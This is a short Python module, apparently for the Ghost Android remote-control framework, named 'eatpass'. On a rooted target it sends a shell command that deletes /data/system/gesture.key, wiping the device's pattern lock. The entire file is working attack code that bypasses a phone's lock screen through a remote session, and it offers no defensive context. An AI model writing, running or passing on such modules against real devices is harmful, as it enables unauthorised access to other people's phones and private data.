#!/usr/bin/env python3

# Valentin Lobstein 2022
# Default Project : https://github.com/EntySec/Ghost

from core.badges import badges
from core.ghost import ghost

class GhostModule:
    def __init__(self):
        self.badges = badges()
        self.ghost = ghost()

        self.name = "eatpass"
        self.description = "Eat device passcode."
        self.usage = "Usage: eatpass"
        self.type = "root"
        self.args = 1

    def run(self, cmd_data):
        if self.ghost.is_root:
            print(self.badges.G + "Eating device passcode...")
            result = self.ghost.send_command("shell","rm /data/system/gesture.key")
        else:
            print(self.badges.E + "Target device is not rooted!")
